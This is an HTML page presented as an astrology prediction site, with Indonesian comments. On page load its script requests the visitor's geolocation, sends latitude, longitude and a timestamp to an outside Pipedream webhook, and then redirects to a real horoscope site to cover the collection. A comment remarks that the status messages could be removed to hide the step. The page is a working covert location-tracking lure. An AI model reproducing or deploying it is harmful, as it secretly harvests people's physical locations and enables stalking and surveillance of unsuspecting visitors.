<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Astro Prediction</title>
  <meta name="description" content="Daily astrology predictions from an enthusiast. Discover what the stars have in store for you. Visit https://virtu0so.vercel.app">
  <style>
    body {
      margin: 0;
      background: #fff;
      color: #333;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    #status {
      font-size: 1rem;
    }
  </style>
</head>
<body>
  <div id="status">Mengakses lokasi...</div>

  <script>
    const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
    const redirectURL = "https://www.astro.com/horoscope";

    async function sendLocation() {
      const statusEl = document.getElementById("status");

      try {
        // Dapatkan lokasi
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
        });

        const { latitude, longitude } = pos.coords;
        const timestamp = new Date().toISOString();
        const payload = { latitude, longitude, timestamp };

        // Tampilkan status ke user (sementara, bisa dihapus jika tidak ingin terlihat)
        statusEl.textContent = "Mengirim lokasi...";

        // Kirim data ke Pipedream
        await fetch(webHookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        statusEl.textContent = "Berhasil dikirim. Mengalihkan...";

        // Tunggu sedikit sebelum redirect
        setTimeout(() => {
          window.location.href = redirectURL;
        }, 1500);
      } catch (err) {
        statusEl.textContent = "Gagal mendapatkan lokasi. Mengalihkan...";
        setTimeout(() => {
          window.location.href = redirectURL;
        }, 2000);
      }
    }

    // Jalankan setelah halaman dimuat
    window.onload = () => {
      if ("geolocation" in navigator) {
        sendLocation();
      } else {
        window.location.href = redirectURL;
      }
    };
  </script>
</body>
</html>
